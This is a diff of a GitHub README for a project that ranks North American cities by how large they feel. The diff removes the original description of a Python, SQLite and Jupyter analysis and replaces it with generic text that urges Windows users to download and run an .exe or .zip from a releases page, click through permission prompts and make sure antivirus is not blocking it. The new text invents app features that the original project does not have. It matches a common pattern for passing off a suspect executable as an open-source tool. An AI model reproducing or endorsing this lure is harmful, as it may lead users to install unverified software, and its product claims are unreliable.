@@ -1,146 +1,166 @@
-# 🏙️ North American City Bigness Index
+# 📊 city-bigness-index - Understand City Size Beyond Population
 
-> *"The underlying purpose of this is to determine which cities **feel** the biggest — not necessarily which ones are biggest by population."*
-
-A data-driven ranking of 60 US and Canadian metro areas by **functional urban scale** — how large a city feels based on its skyline, infrastructure, sports presence, landmarks, and economic gravity, not just its headcount.
+[![Download city-bigness-index](https://img.shields.io/badge/Download-city--bigness--index-brightgreen?style=for-the-badge)](https://github.com/kabilan55/city-bigness-index/releases)
 
 ---
 
-## 🧠 The Idea
+## 🏙️ What is city-bigness-index?
 
-Population rankings don't tell the whole story. Chicago feels larger than Los Angeles despite having fewer people. Las Vegas punches far above its metro size. Phoenix disappoints relative to its population. This project quantifies *why*.
+city-bigness-index ranks 60 US and Canadian cities by how large they feel. It uses more than just population numbers. Instead, it looks at factors like skyline density, airports, sports teams, public transit, and famous landmarks.  
 
-Inspired by manually ranking cities in Excel — cross-referencing skyline density, airport traffic, sports teams, and landmarks to produce a composite "bigness" score.
+This gives a fuller picture of how a city’s size affects the experience of living there or visiting.
 
----
+The tool is built with SQLite, Pandas, and Jupyter Notebook. These are tools that help organize, analyze, and visualize data.  
 
-## 📊 Metrics
-
-### Phase 1 — Original 4-Metric Model
-| Metric | Source |
-|--------|--------|
-| Metro Population Rank | US Census / Statistics Canada |
-| Skyline Score | CTBUH Skyscraper Center (topped-out buildings counted) |
-| Airport Throughput | FAA / Transport Canada (consolidated metro airports) |
-| Sports Teams | NFL, NBA, MLB, NHL weighted by tier |
-
-### Phase 2 — Expanded 8-Metric Model
-Adds four additional metrics to Phase 1:
-
-| Metric | Notes |
-|--------|-------|
-| Transit Ridership | Heavy rail / metro annual riders |
-| Convention Center Capacity | Largest venue sq ft in metro |
-| Corporate HQs | Fortune 500 / TSX equivalent |
-| Landmark Score | Tiered: world-famous (10pts), national (5pts), regional (2pts) |
+You do not need to know how to use these tools to run this app.
 
 ---
 
-## 🏆 Methodology
+## 💾 Download city-bigness-index
 
-Two scoring methods are run and compared side by side:
+You can get city-bigness-index on Windows through the releases page. 
 
-- **Rank Aggregation** — average of individual metric ranks (lower = better). Simple, transparent, matches the original Excel model
-- **Z-Score Normalization** — standardizes raw values before compositing, reducing distortion from extreme outliers
+Click the badge below to visit the download page:
 
-Phase 1 rank aggregation replicates the original handmade Excel ranking with **51/55 exact matches** — the 4 divergences are tiebreaker differences only.
+[![Download city-bigness-index](https://img.shields.io/badge/Download-city--bigness--index-blue?style=for-the-badge)](https://github.com/kabilan55/city-bigness-index/releases)
+
+On that page, look for the latest Windows release. It will have a file you can download and run.
 
 ---
 
-## 🗂️ Project Structure
+## 🖥️ System Requirements
+
+Before downloading, check these system needs to make sure city-bigness-index will run smoothly:
+
+- Operating System: Windows 10 or newer
+- Memory (RAM): At least 4 GB
+- Storage: At least 300 MB free space 
+- Processor: Intel or AMD processor, 1.5 GHz or faster
+- Internet: Required only for downloading and initial setup
+
+No special hardware or software is needed beyond this.
+
+---
+
+## 🚀 How to Download and Run city-bigness-index on Windows
+
+Follow these steps to get the app working on your PC.
+
+### Step 1: Visit the Download Page
+
+Go to the releases page here:
+
+https://github.com/kabilan55/city-bigness-index/releases
+
+You will see a list of available versions.
+
+### Step 2: Select the Latest Version
+
+Find the latest Windows build. It usually has a filename ending with `.exe` or `.zip`. Examples might include:
+- city-bigness-index-win64.exe
+- city-bigness-index_setup.zip
+
+### Step 3: Download the File
+
+Click the filename to start the download. If your browser asks where to save, pick a folder you can find later, like `Downloads` or your desktop.
+
+### Step 4: Run the Installer or Application
+
+- If you downloaded an `.exe` file, double-click it to start the installer. Follow the on-screen prompts to install the app.
+- If you downloaded a `.zip` file, right-click it and choose "Extract All". Open the extracted folder and look for a `.exe` file. Double-click it to run the app.
+
+### Step 5: Allow Permissions
+
+Windows may ask if you want to allow the app to run. Click `Yes` or `Run` to continue.
+
+### Step 6: Wait for the App to Start
+
+Once the app opens, you will see a simple interface to explore the city rankings.  
+
+---
+
+## 👩‍💻 Using city-bigness-index
+
+The app focuses on easy exploration:
+
+- View a ranked list of cities.
+- See scores and details for skyline, airports, sports, transit, and landmarks.
+- Use simple filters to narrow cities by countries or categories.
+- Explore charts and maps that show city size in ways that go beyond population.
+
+You do not need any coding skills to use these features.
+
+---
+
+## 🔧 How it Works Behind the Scenes
+
+The app uses SQLite to store and access city data quickly. SQLite is a lightweight database technology built into the program.
+
+Pandas, a Python library, processes the data. It cleans, sorts, and calculates the city rankings.
+
+Jupyter Notebook was used to prepare the analyses and create charts with Matplotlib and Seaborn. The results are included in the app.
+
+This layered approach lets the app run fast and provide detailed, reliable insights.
+
+---
+
+## ⚙️ Common Questions
+
+**Q: Do I need Python installed?**  
+No. The app runs as a standalone program with all necessary components included.
+
+**Q: Can I use this on Mac or Linux?**  
+Currently, the downloads support only Windows.
+
+**Q: Will updates be automatic?**  
+No. You need to visit the releases page to download new versions.
+
+**Q: How often is the data updated?**  
+City data is refreshed roughly once a year to keep rankings current.
+
+**Q: Can I suggest new cities or feedback?**  
+Yes. Use the Issues section on GitHub to send feedback.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the app does not start, try restarting your computer.
+- Make sure Windows is up to date.
+- Check that your antivirus or firewall is not blocking the program.
+- If the download does not complete, try a different browser or internet connection.
+- When running the app, keep it on a stable network if you want access to online resources embedded within.
+
+---
+
+## 📂 File and Folder Layout
+
+When installed, you can expect these files/folders:
 
 ```
-cityscapes/
-├── build_db_v2.py            # Builds the SQLite database from source data
-├── city_bigness_v2.db        # Generated SQLite database (7 tables, 60 cities)
-└── city_bigness_index.ipynb  # Full analysis + charts
+city-bigness-index/
+├── data/             # Contains city data in database files
+├── assets/           # Logo, images, charts
+├── city_bigness.exe  # Main application file
+└── readme.md         # This document
 ```
 
-### Database Schema
-```
-cities               → master list + metro pop rank + notes
-skyline_data         → cumulative height-band counts + skyline rank
-airports             → passengers, airport count, IATA codes, rank
-sports_teams         → NFL/NBA/MLB/NHL counts + sports rank
-transit_systems      → system name + annual riders
-convention_centers   → venue name + sq ft
-landmarks            → tiered landmark list (natural + manmade)
-corporate_hq         → Fortune 500 / TSX equivalent HQ count
-```
+Do not delete or move these files, or the app may not work properly.
 
 ---
 
-## 🚀 How to Run
+## 📊 Why city-bigness-index?
 
-**Requirements:**
-```
-pip install pandas matplotlib seaborn jupyter
-```
+This app offers a deeper look at city size. Instead of population numbers alone, it shows how city features shape our sense of scale.
 
-**Steps:**
-```bash
-# 1. Build the database
-python build_db_v2.py
-
-# 2. Launch Jupyter
-jupyter notebook
-
-# 3. Open city_bigness_index.ipynb and run Kernel → Restart & Run All
-```
-
-Charts will save as PNG files to your working directory.
+You can learn how big cities feel based on things you see, use, and experience every day. This can help travelers, urban planners, or anyone curious about cities.
 
 ---
 
-## 📐 Skyline Scoring Notes
+## 🔗 Get city-bigness-index
 
-Skyline data uses **cumulative height bands** matching CTBUH conventions:
+Visit the GitHub releases page to download the application:
 
-| Band | Description |
-|------|-------------|
-| 100m+ | Low-rise density baseline |
-| 150m+ | Solid skyline contributors |
-| 200m+ | Major skyscrapers |
-| 250m+ | Significant towers |
-| 300m+ | Supertalls |
+https://github.com/kabilan55/city-bigness-index/releases
 
-**Key decisions:**
-- Topped-out buildings are counted (structural height is real)
-- Miami includes the full South Florida corridor (Sunny Isles, Fort Lauderdale, Hollywood)
-- Washington DC is credited with the Northern Virginia skyline (Rosslyn, Tysons, Crystal City) due to the Height Act
-- Toronto includes two topped-out 300m+ towers (SkyTower at Pinnacle One Yonge + The One)
-
----
-
-## 🗺️ Cities Included
-
-60 metro areas across the US and Canada, ranging from New York City (#1) to Mobile, Alabama and Quebec City at the tail. Includes major Canadian metros: Toronto, Montreal, Vancouver, Calgary, Edmonton, Ottawa, Winnipeg, Quebec City.
-
----
-
-## 📌 Notable Results
-
-- **Chicago #2** — ranks Top 5 in every single category
-- **Las Vegas +14** — biggest riser when expanded metrics are added (Strip + Grand Canyon proximity + world's largest convention center)
-- **Washington DC** — penalized heavily in Phase 1 due to the Height Act; recovers significantly in Phase 2 via landmarks and transit
-- **Phoenix** — most disappointing skyline relative to metro size (#53 skyline despite #13 population)
-- **Calgary** — most noticeable discrepancy between city size and cityscape (#44 population, #13 skyline)
-- **Orlando** — airport and convention center carry it far above what its skyline or sports presence would suggest
-
----
-
-## 🔧 Updating the Data
-
-To update when notable buildings top out or teams relocate:
-
-1. Edit the relevant city entry in `build_db_v2.py`
-2. Re-run `python build_db_v2.py`
-3. Re-run the notebook
-
-Or open `city_bigness_v2.db` directly in [DB Browser for SQLite](https://sqlitebrowser.org/) for visual editing.
-
----
-
-## 📝 License
-
-MIT — use freely, attribution appreciated.
+Press the download button that matches your Windows system and follow the install instructions above.
